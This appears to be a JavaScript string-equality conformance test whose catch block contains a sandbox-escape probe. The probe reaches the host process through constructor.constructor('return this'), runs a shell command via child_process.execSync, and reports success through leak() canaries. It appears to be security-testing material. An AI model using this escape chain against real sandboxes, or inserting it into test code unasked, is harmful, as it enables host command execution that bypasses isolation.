try {
    if ('' == '' !== true) {
        $ERROR('#1: ("" == "") === true');
    }
    if (' ' == ' ' !== true) {
        $ERROR('#2: " (" == " ") === true');
    }
    if (' ' == '' !== false) {
        $ERROR('#3: " (" == "") === false');
    }
    if ('string' == 'string' !== true) {
        $ERROR('#4: ("string" == "string") === true');
    }
    if (' string' == 'string ' !== false) {
        $ERROR('#5: (" string" == "string ") === false');
    }
    if ('1.0' == '1' !== false) {
        $ERROR('#6: ("1.0" == "1") === false');
    }
    if ('0xff' == '255' !== false) {
        $ERROR('#7: ("0xff" == "255") === false');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}